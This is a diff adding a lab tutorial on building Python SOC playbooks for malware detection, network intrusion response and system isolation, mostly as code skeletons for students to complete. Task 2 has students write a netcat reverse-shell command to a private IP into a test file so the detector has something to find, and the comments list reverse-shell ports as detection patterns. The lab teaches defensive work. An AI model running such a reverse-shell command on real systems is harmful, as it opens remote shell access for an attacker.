@@ -1,0 +1,528 @@
+SOC Playbooks Development
+Objectives
+By the end of this lab, students will be able to:
+
+Design and implement automated SOC playbooks using Python
+Create incident response workflows for common security events
+Develop containment and remediation scripts
+Implement logging and notification systems for security incidents
+Build reusable playbook frameworks for SOC operations
+Prerequisites
+Basic Python programming skills
+Understanding of cybersecurity incident response concepts
+Familiarity with Linux command line
+Knowledge of network security fundamentals
+Basic understanding of log analysis
+Lab Environment
+Al Nafi Cloud Machine Setup: Click Start Lab to access your pre-configured Linux environment with Python 3.x, essential libraries, and security tools pre-installed.
+
+Task 1: Building the Base Playbook Framework
+Step 1: Create Project Structure
+Create the directory structure for your SOC playbooks:
+
+mkdir -p ~/soc_playbooks/{scripts,logs,config,evidence}
+cd ~/soc_playbooks
+mkdir -p logs/{incidents,alerts,reports}
+Step 2: Create Base Playbook Class
+Create scripts/base_playbook.py:
+
+#!/usr/bin/env python3
+"""
+Base SOC Playbook Framework
+Students: Complete the TODO sections to implement core functionality
+"""
+
+import logging
+import datetime
+import json
+import os
+
+class BasePlaybook:
+    def __init__(self, playbook_name, severity="medium"):
+        """
+        Initialize base playbook with logging and tracking.
+        
+        Args:
+            playbook_name: Name of the playbook
+            severity: Incident severity (low, medium, high, critical)
+        """
+        self.playbook_name = playbook_name
+        self.severity = severity
+        self.start_time = datetime.datetime.now()
+        self.incident_id = self._generate_incident_id()
+        self.actions_log = []
+        self._setup_logging()
+        
+    def _generate_incident_id(self):
+        """Generate unique incident ID with timestamp"""
+        # TODO: Create incident ID format: INC-YYYYMMDD-HHMMSS
+        pass
+        
+    def _setup_logging(self):
+        """Configure logging to file and console"""
+        # TODO: Setup logging with INFO level
+        # TODO: Create log file in logs/incidents/
+        # TODO: Add both file and console handlers
+        pass
+        
+    def log_action(self, action, status, details=""):
+        """
+        Log playbook action with structured format.
+        
+        Args:
+            action: Action being performed
+            status: Status (STARTED, SUCCESS, FAILED, ERROR)
+            details: Additional details
+        """
+        # TODO: Create log entry dictionary with timestamp
+        # TODO: Append to actions_log list
+        # TODO: Write to logger
+        pass
+        
+    def execute_command(self, command, description=""):
+        """
+        Execute system command safely with timeout.
+        
+        Args:
+            command: Shell command to execute
+            description: Description of the command
+            
+        Returns:
+            tuple: (success: bool, output: str)
+        """
+        # TODO: Import subprocess module
+        # TODO: Execute command with 30 second timeout
+        # TODO: Capture stdout and stderr
+        # TODO: Log the execution and result
+        # TODO: Return success status and output
+        pass
+        
+    def send_alert(self, message, priority="normal"):
+        """
+        Send alert notification (write to alert log).
+        
+        Args:
+            message: Alert message
+            priority: Priority level (low, normal, high, critical)
+        """
+        # TODO: Create alert dictionary with timestamp and incident_id
+        # TODO: Write to logs/alerts/alerts.log
+        # TODO: Log the alert action
+        pass
+        
+    def generate_report(self):
+        """Generate incident report with all logged actions"""
+        # TODO: Calculate duration
+        # TODO: Create report dictionary with incident details
+        # TODO: Include all actions from actions_log
+        # TODO: Write report to logs/reports/
+        # TODO: Return report file path
+        pass
+Make executable:
+
+chmod +x scripts/base_playbook.py
+Task 2: Developing Malware Detection Playbook
+Step 1: Create Malware Detection Script
+Create scripts/malware_detection.py:
+
+#!/usr/bin/env python3
+"""
+Malware Detection and Response Playbook
+Students: Implement detection and containment logic
+"""
+
+import sys
+import os
+import psutil
+import hashlib
+
+sys.path.append(os.path.dirname(os.path.abspath(__file__)))
+from base_playbook import BasePlaybook
+
+class MalwareDetectionPlaybook(BasePlaybook):
+    def __init__(self):
+        super().__init__("malware_detection", "high")
+        self.suspicious_processes = []
+        self.suspicious_files = []
+        
+    def scan_processes(self):
+        """
+        Scan running processes for suspicious activity.
+        Look for: unusual process names, suspicious command lines,
+        processes running from /tmp or /dev/shm
+        """
+        # TODO: Iterate through psutil.process_iter()
+        # TODO: Check process name, cmdline, and exe path
+        # TODO: Flag suspicious patterns (reverse shells, unusual locations)
+        # TODO: Store suspicious processes in self.suspicious_processes
+        # TODO: Log findings
+        pass
+        
+    def scan_files(self, scan_paths=['/tmp', '/var/tmp', '/dev/shm']):
+        """
+        Scan directories for suspicious files.
+        
+        Args:
+            scan_paths: List of directories to scan
+        """
+        # TODO: Walk through each scan path
+        # TODO: Check for recently modified files
+        # TODO: Check for executable scripts (.sh, .py, .pl)
+        # TODO: Check file permissions (world-writable, setuid)
+        # TODO: Store suspicious files in self.suspicious_files
+        pass
+        
+    def calculate_hash(self, filepath):
+        """
+        Calculate SHA256 hash of file.
+        
+        Args:
+            filepath: Path to file
+            
+        Returns:
+            str: SHA256 hash or None on error
+        """
+        # TODO: Open file in binary mode
+        # TODO: Calculate SHA256 hash in chunks
+        # TODO: Return hexdigest
+        pass
+        
+    def quarantine_file(self, filepath):
+        """
+        Move suspicious file to quarantine directory.
+        
+        Args:
+            filepath: Path to file to quarantine
+            
+        Returns:
+            str: Path to quarantined file
+        """
+        # TODO: Create quarantine directory if not exists
+        # TODO: Generate unique quarantine filename with incident_id
+        # TODO: Calculate hash before moving
+        # TODO: Move file to quarantine
+        # TODO: Log the quarantine action
+        pass
+        
+    def terminate_process(self, pid):
+        """
+        Terminate suspicious process.
+        
+        Args:
+            pid: Process ID to terminate
+            
+        Returns:
+            bool: True if successful
+        """
+        # TODO: Try SIGTERM first
+        # TODO: If fails, try SIGKILL
+        # TODO: Log termination attempt
+        pass
+        
+    def run(self):
+        """Execute complete malware detection workflow"""
+        # TODO: Log playbook start
+        # TODO: Scan processes
+        # TODO: Scan files
+        # TODO: If threats found, send high priority alert
+        # TODO: Quarantine suspicious files
+        # TODO: Terminate suspicious processes
+        # TODO: Generate and save report
+        # TODO: Log completion
+        pass
+
+if __name__ == "__main__":
+    playbook = MalwareDetectionPlaybook()
+    playbook.run()
+Make executable:
+
+chmod +x scripts/malware_detection.py
+Step 2: Test Malware Detection
+Create a test suspicious file:
+
+echo '#!/bin/bash' > /tmp/test_suspicious.sh
+echo 'nc -e /bin/bash 192.168.1.100 4444' >> /tmp/test_suspicious.sh
+chmod +x /tmp/test_suspicious.sh
+Run the playbook:
+
+python3 scripts/malware_detection.py
+Check the logs and quarantine directory:
+
+ls -la logs/incidents/
+ls -la logs/incidents/quarantine/
+Task 3: Creating Network Intrusion Response Playbook
+Step 1: Develop Network Intrusion Script
+Create scripts/network_intrusion.py:
+
+#!/usr/bin/env python3
+"""
+Network Intrusion Detection and Response Playbook
+Students: Implement network monitoring and blocking logic
+"""
+
+import sys
+import os
+import re
+from collections import defaultdict
+
+sys.path.append(os.path.dirname(os.path.abspath(__file__)))
+from base_playbook import BasePlaybook
+
+class NetworkIntrusionPlaybook(BasePlaybook):
+    def __init__(self):
+        super().__init__("network_intrusion", "high")
+        self.suspicious_ips = []
+        self.blocked_ips = []
+        self.suspicious_ports = []
+        
+    def analyze_connections(self):
+        """
+        Analyze network connections for suspicious activity.
+        Check for: unusual ports, high connection counts, foreign IPs
+        """
+        # TODO: Execute 'netstat -tuln' to get listening ports
+        # TODO: Parse output for suspicious ports (1234, 4444, 31337, etc.)
+        # TODO: Execute 'netstat -tun' for established connections
+        # TODO: Count connections per IP
+        # TODO: Flag IPs with >10 connections
+        # TODO: Store findings in suspicious_ips and suspicious_ports
+        pass
+        
+    def check_auth_logs(self):
+        """
+        Check authentication logs for failed login attempts.
+        Look for brute force patterns.
+        """
+        # TODO: Read /var/log/auth.log (if accessible)
+        # TODO: Search for 'Failed password' entries
+        # TODO: Extract IP addresses using regex
+        # TODO: Count failed attempts per IP
+        # TODO: Flag IPs with >=5 failed attempts
+        pass
+        
+    def is_private_ip(self, ip):
+        """
+        Check if IP is private/local.
+        
+        Args:
+            ip: IP address string
+            
+        Returns:
+            bool: True if private IP
+        """
+        # TODO: Check against private IP ranges
+        # TODO: 10.x.x.x, 192.168.x.x, 172.16-31.x.x, 127.x.x.x
+        pass
+        
+    def block_ip(self, ip):
+        """
+        Block IP address using iptables.
+        
+        Args:
+            ip: IP address to block
+            
+        Returns:
+            bool: True if successful
+        """
+        # TODO: Skip if private IP
+        # TODO: Execute iptables command to DROP packets from IP
+        # TODO: Log the blocking action
+        # TODO: Add to blocked_ips list
+        pass
+        
+    def close_port(self, port):
+        """
+        Attempt to close suspicious listening port.
+        
+        Args:
+            port: Port number to close
+            
+        Returns:
+            bool: True if successful
+        """
+        # TODO: Find process using 'lsof -ti:PORT'
+        # TODO: Terminate the process
+        # TODO: Log the action
+        pass
+        
+    def generate_network_report(self):
+        """Generate detailed network security report"""
+        # TODO: Create report with suspicious_ips, blocked_ips, suspicious_ports
+        # TODO: Include threat summary
+        # TODO: Write to logs/reports/network_report_INCIDENT_ID.json
+        pass
+        
+    def run(self):
+        """Execute network intrusion response workflow"""
+        # TODO: Log playbook start
+        # TODO: Analyze network connections
+        # TODO: Check authentication logs
+        # TODO: If threats found, send alert
+        # TODO: Block suspicious IPs
+        # TODO: Close suspicious ports
+        # TODO: Generate network report
+        # TODO: Generate incident report
+        # TODO: Log completion
+        pass
+
+if __name__ == "__main__":
+    playbook = NetworkIntrusionPlaybook()
+    playbook.run()
+Make executable:
+
+chmod +x scripts/network_intrusion.py
+Step 2: Test Network Intrusion Detection
+Simulate suspicious activity:
+
+# Create multiple connections (in separate terminal if needed)
+for i in {1..15}; do curl -s http://localhost:80 & done
+Run the playbook:
+
+python3 scripts/network_intrusion.py
+Review the network report:
+
+cat logs/reports/network_report_*.json
+Task 4: Implementing System Isolation Playbook
+Step 1: Create System Isolation Script
+Create scripts/system_isolation.py:
+
+#!/usr/bin/env python3
+"""
+System Isolation and Evidence Collection Playbook
+Students: Implement isolation and forensic collection
+"""
+
+import sys
+import os
+import shutil
+
+sys.path.append(os.path.dirname(os.path.abspath(__file__)))
+from base_playbook import BasePlaybook
+
+class SystemIsolationPlaybook(BasePlaybook):
+    def __init__(self):
+        super().__init__("system_isolation", "critical")
+        self.evidence_files = []
+        self.network_isolated = False
+        
+    def collect_system_info(self):
+        """
+        Collect system information for forensic analysis.
+        Gather: running processes, network connections, users, logs
+        """
+        # TODO: Create evidence directory
+        # TODO: Collect 'ps aux' output
+        # TODO: Collect 'netstat -tuln' output
+        # TODO: Collect 'last -n 50' output
+        # TODO: Copy /var/log/auth.log (if accessible)
+        # TODO: Collect environment variables
+        # TODO: Store all evidence files in evidence_files list
+        pass
+        
+    def collect_memory_info(self):
+        """Collect memory and process information"""
+        # TODO: Copy /proc/meminfo
+        # TODO: Copy /proc/cpuinfo
+        # TODO: Collect loaded kernel modules (lsmod)
+        pass
+        
+    def isolate_network(self):
+        """
+        Isolate system from network while preserving evidence.
+        Use iptables to block all traffic except management.
+        """
+        # TODO: Backup current iptables rules
+        # TODO: Block all incoming traffic (except SSH from specific IP)
+        # TODO: Block all outgoing traffic (except to logging server)
+        # TODO: Set network_isolated flag
+        # TODO: Log isolation actions
+        pass
+        
+    def disable_services(self, services=['apache2', 'nginx', 'mysql']):
+        """
+        Disable non-essential services.
+        
+        Args:
+            services: List of services to disable
+        """
+        # TODO: For each service, execute 'systemctl stop SERVICE'
+        # TODO: Log each service stop attempt
+        pass
+        
+    def create_evidence_archive(self):
+        """
+        Create compressed archive of all evidence.
+        
+        Returns:
+            str: Path to evidence archive
+        """
+        # TODO: Create archive filename with incident_id
+        # TODO: Use shutil.make_archive to compress evidence directory
+        # TODO: Calculate hash of archive
+        # TODO: Log archive creation
+        pass
+        
+    def restore_network(self):
+        """Restore network connectivity (use with caution)"""
+        # TODO: Restore iptables rules from backup
+        # TODO: Log restoration
+        # TODO: Set network_isolated to False
+        pass
+        
+    def run(self):
+        """Execute system isolation workflow"""
+        # TODO: Log playbook start with CRITICAL severity
+        # TODO: Send critical alert
+        # TODO: Collect system information
+        # TODO: Collect memory information
+        # TODO: Isolate network
+        # TODO: Disable non-essential services
+        # TODO: Create evidence archive
+        # TODO: Generate incident report
+        # TODO: Send completion alert with evidence location
+        pass
+
+if __name__ == "__main__":
+    playbook = SystemIsolationPlaybook()
+    playbook.run()
+Make executable:
+
+chmod +x scripts/system_isolation.py
+Step 2: Test System Isolation (Carefully)
+Warning: This will isolate your system. Only run in test environment.
+
+# Review the script first
+python3 scripts/system_isolation.py
+Check collected evidence:
+
+ls -la logs/incidents/evidence_*/
+Expected Outcomes
+After completing this lab, you should have:
+
+Base Framework: Reusable playbook class with logging and reporting
+Malware Detection: Automated process and file scanning with quarantine
+Network Response: Connection monitoring and IP blocking capabilities
+System Isolation: Evidence collection and network isolation procedures
+Complete Logs: Structured logs in JSON format for all incidents
+Reports: Detailed incident reports with timestamps and actions
+Troubleshooting Tips
+Permission Errors:
+
+Use sudo for commands requiring root access (iptables, systemctl)
+Ensure log directories are writable: chmod 755 logs/
+Import Errors:
+
+Verify sys.path.append() points to correct directory
+Check that base_playbook.py exists and is executable
+Command Execution Failures:
+
+Test commands manually first: netstat -tuln, ps aux
+Check command syntax in execute_command() method
+Verify timeout settings for long-running commands
+No Threats Detected:
+
+Create test suspicious files in /tmp
+Simulate network connections with curl or netcat
+Check detection thresholds in your code
+Conclusion
+In this lab, you developed automated SOC playbooks for incident response. You created a reusable framework, implemented malware detection with quarantine capabilities, built network intrusion response with IP blocking, and developed system isolation procedures with evidence collection. These playbooks form the foundation of automated security operations, enabling rapid response to security incidents while maintaining detailed audit trails. Practice extending these playbooks with additional detection rules, notification integrations, and remediation actions to build a comprehensive SOC automation platform.
